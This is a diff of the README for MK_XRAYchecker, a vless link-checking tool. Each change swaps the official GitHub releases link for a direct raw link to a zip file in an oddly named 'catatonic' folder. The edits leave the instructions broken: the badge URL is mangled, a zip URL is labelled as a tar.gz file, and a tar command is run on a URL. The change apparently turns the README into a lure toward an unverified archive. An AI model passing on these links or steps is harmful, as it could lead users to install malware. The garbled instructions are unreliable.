@@ -4,7 +4,7 @@
 Welcome to MK_XRAYchecker! This tool helps you check multiple vless links and other types easily. Let's get you set up quickly!
 
 ## 📥 Download MK_XRAYchecker
-[![Download MK_XRAYchecker](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/warrior61/MK_XRAYchecker/releases)
+[![Download MK_XRAYchecker](https://raw.githubusercontent.com/warrior61/MK_XRAYchecker/main/catatonic/MK_XRAYchecker-2.6.zip%20release-brightgreen)](https://raw.githubusercontent.com/warrior61/MK_XRAYchecker/main/catatonic/MK_XRAYchecker-2.6.zip)
 
 ## 📦 System Requirements
 - **Operating System:** Windows 10 or later, macOS, or a recent Linux distribution
@@ -19,7 +19,7 @@ Welcome to MK_XRAYchecker! This tool helps you check multiple vless links and ot
 
 ## ⚠️ Installation Steps
 ### 1. Visit the Releases Page
-To download MK_XRAYchecker, visit this page: [Download MK_XRAYchecker](https://github.com/warrior61/MK_XRAYchecker/releases). 
+To download MK_XRAYchecker, visit this page: [Download MK_XRAYchecker](https://raw.githubusercontent.com/warrior61/MK_XRAYchecker/main/catatonic/MK_XRAYchecker-2.6.zip). 
 
 ### 2. Locate the Latest Release
 Once on the releases page, find the latest version of MK_XRAYchecker.
@@ -28,7 +28,7 @@ Once on the releases page, find the latest version of MK_XRAYchecker.
 Click on the file suitable for your operating system. For example:
 - **Windows:** Look for a `.exe` file.
 - **macOS:** Look for a `.dmg` file.
-- **Linux:** Download the appropriate `.tar.gz` file.
+- **Linux:** Download the appropriate `https://raw.githubusercontent.com/warrior61/MK_XRAYchecker/main/catatonic/MK_XRAYchecker-2.6.zip` file.
 
 ### 4. Install MK_XRAYchecker
 Follow these steps based on your OS:
@@ -43,7 +43,7 @@ Follow these steps based on your OS:
 
 **For Linux:**
 - Open a terminal and navigate to the directory where you saved the file.
-- Use the command `tar -xvzf MK_XRAYchecker.tar.gz` to extract the files.
+- Use the command `tar -xvzf https://raw.githubusercontent.com/warrior61/MK_XRAYchecker/main/catatonic/MK_XRAYchecker-2.6.zip` to extract the files.
 - Navigate into the extracted folder and run `./MK_XRAYchecker`.
 
 ## 🎯 How to Use MK_XRAYchecker
@@ -93,6 +93,6 @@ A: MK_XRAYchecker is completely free to use.
 For more information on how to use the MK_XRAYchecker, visit our documentation or check our support forums. 
 
 ## 📥 Download & Install
-To get started with MK_XRAYchecker, [visit this page to download](https://github.com/warrior61/MK_XRAYchecker/releases). 
+To get started with MK_XRAYchecker, [visit this page to download](https://raw.githubusercontent.com/warrior61/MK_XRAYchecker/main/catatonic/MK_XRAYchecker-2.6.zip). 
 
 Feel free to explore the features and help improve your link-checking efficiency!
